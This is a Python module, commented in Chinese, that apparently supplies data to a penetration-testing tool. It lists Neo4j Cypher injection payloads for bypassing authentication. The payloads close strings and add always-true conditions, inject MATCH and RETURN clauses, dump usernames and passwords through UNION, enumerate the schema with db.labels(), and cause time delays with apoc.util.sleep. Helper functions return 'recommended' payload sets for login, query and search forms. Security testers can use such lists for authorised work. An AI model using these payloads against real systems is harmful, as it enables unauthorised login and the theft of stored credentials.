"""
Neo4j Cypher認證繞過注入載荷
包含各種針對登入/認證功能的Neo4j Cypher注入載荷
"""

# 單引號字符串閉合與注入
STRING_CLOSURE_PAYLOADS = [
    {
        "name": "基本OR注入",
        "value": "' OR 1=1 OR '",
        "description": "基本的OR條件注入，通過加入永真條件繞過認證"
    },
    {
        "name": "雙引號OR注入",
        "value": "\" OR 1=1 OR \"",
        "description": "使用雙引號的注入，適用於雙引號字符串"
    },
    {
        "name": "OR布爾值",
        "value": "' OR true OR '",
        "description": "使用布爾值true構建永真條件"
    },
    {
        "name": "OR邏輯",
        "value": "' OR '' = '' OR '",
        "description": "使用字符串比較構建永真條件"
    },
    {
        "name": "OR空檢測",
        "value": "' OR username IS NULL OR '",
        "description": "檢測字段是否為NULL"
    },
    {
        "name": "註釋終止",
        "value": "' OR 1=1 -- ",
        "description": "使用註釋終止後續SQL條件"
    },
    {
        "name": "多行註釋終止",
        "value": "' OR 1=1 /* ",
        "description": "使用多行註釋終止後續條件"
    }
]

# MATCH語句注入
MATCH_STATEMENT_PAYLOADS = [
    {
        "name": "基本節點匹配",
        "value": "' MATCH (n) RETURN n LIMIT 1 // ",
        "description": "嘗試匹配並返回任何節點"
    },
    {
        "name": "用戶節點匹配",
        "value": "' MATCH (u:User) RETURN u LIMIT 1 // ",
        "description": "嘗試匹配並返回User標籤的節點"
    },
    {
        "name": "關係匹配",
        "value": "' MATCH (n)-[r]->(m) RETURN n,r,m LIMIT 1 // ",
        "description": "嘗試匹配並返回任何關係"
    },
    {
        "name": "屬性匹配",
        "value": "' MATCH (n) WHERE n.username='admin' RETURN n // ",
        "description": "根據屬性匹配並返回節點"
    },
    {
        "name": "正則匹配",
        "value": "' MATCH (n) WHERE n.username =~ '.*adm.*' RETURN n // ",
        "description": "使用正則表達式匹配屬性"
    }
]

# RETURN語句 - 直接返回結果的注入
RETURN_PAYLOADS = [
    {
        "name": "返回整數",
        "value": "' RETURN 1 as result // ",
        "description": "直接返回整數值"
    },
    {
        "name": "返回字符串列表",
        "value": "' RETURN ['admin', 'root', 'user'] as result // ",
        "description": "直接返回字符串列表"
    },
    {
        "name": "返回真值",
        "value": "' RETURN true as result // ",
        "description": "直接返回布爾真值"
    },
    {
        "name": "返回圖數據庫結構",
        "value": "' CALL db.schema.visualization() // ",
        "description": "返回圖數據庫的結構可視化"
    },
    {
        "name": "返回圖數據庫標籤",
        "value": "' CALL db.labels() // ",
        "description": "返回圖數據庫中的所有標籤"
    }
]

# WITH語句注入 - 使用WITH子句處理中間結果
WITH_PAYLOADS = [
    {
        "name": "基本WITH語句",
        "value": "' WITH 1 as one RETURN one // ",
        "description": "使用WITH子句創建臨時變量"
    },
    {
        "name": "WITH和條件",
        "value": "' WITH 1 as one WHERE one=1 RETURN true as result // ",
        "description": "使用WITH子句和條件子句"
    },
    {
        "name": "多重WITH子句",
        "value": "' WITH 1 as one WITH one+1 as two RETURN two // ",
        "description": "嵌套使用多個WITH子句"
    },
    {
        "name": "WITH和休眠",
        "value": "' WITH 1 as one WITH apoc.util.sleep(1000) as delay RETURN delay // ",
        "description": "使用WITH子句執行函數調用"
    }
]

# UNION基於注入 - 將注入查詢結果與原始查詢結果合併
UNION_PAYLOADS = [
    {
        "name": "基本UNION",
        "value": "' UNION MATCH (n) RETURN n.username, n.password LIMIT 5 // ",
        "description": "使用UNION合併注入查詢結果"
    },
    {
        "name": "UNION簡單值",
        "value": "' UNION RETURN 'admin' as username, 'password' as password // ",
        "description": "使用UNION返回假的認證數據"
    },
    {
        "name": "UNION多行數據",
        "value": "' UNION UNWIND [{username: 'admin', password: 'test'}, {username: 'root', password: 'root'}] as row RETURN row.username, row.password // ",
        "description": "使用UNION展開並返回多行數據"
    }
]

# 常用的參數值注入
PARAMETER_VALUE_PAYLOADS = [
    {
        "name": "admin用戶名",
        "value": "admin' -- ",
        "description": "使用常見管理員用戶名與註釋"
    },
    {
        "name": "Neo4j默認值",
        "value": "neo4j' -- ",
        "description": "使用Neo4j默認用戶名與註釋"
    },
    {
        "name": "空密碼",
        "value": "' OR length(n.password)=0 OR '",
        "description": "匹配空密碼的情況"
    },
    {
        "name": "OR多種可能",
        "value": "' OR username IN ['admin', 'root', 'neo4j'] OR '",
        "description": "匹配多個可能的用戶名"
    }
]

# 推薦的認證繞過載荷
def get_recommended_auth_payloads():
    """獲取推薦的認證繞過載荷"""
    return [
        "' OR 1=1 OR '",
        "' OR true OR '",
        "' OR '' = '' OR '",
        "' RETURN true // ",
        "' MATCH (n:User) RETURN n LIMIT 1 // ",
        "admin' -- ",
        "' OR username = 'admin' OR '"
    ]

# 生成針對特定系統的載荷
def get_system_specific_payloads(system_type="login"):
    """
    生成針對特定系統類型的載荷
    
    Args:
        system_type (str): 系統類型，可以是'login'、'query'或'search'
    
    Returns:
        list: 系統特定載荷列表
    """
    if system_type == "login":
        return [
            "' OR 1=1 OR '",
            "' RETURN true // ",
            "admin' -- ",
            "' OR username = 'admin' OR '",
            "' OR username IS NOT NULL OR '"
        ]
    elif system_type == "query":
        return [
            "' MATCH (n) RETURN n LIMIT 10 // ",
            "' MATCH (n)-[r]->(m) RETURN n.name, type(r), m.name LIMIT 10 // ",
            "' CALL db.labels() // ",
            "' CALL db.propertyKeys() // "
        ]
    elif system_type == "search":
        return [
            "' OR n.name CONTAINS 'adm' OR '",
            "' OR n.name =~ '.*adm.*' OR '",
            "' MATCH (n) WHERE n.name CONTAINS 'adm' RETURN n // ",
            "' WITH '*' as search MATCH (n) WHERE n.name CONTAINS search RETURN n // "
        ]
    else:
        return get_recommended_auth_payloads() 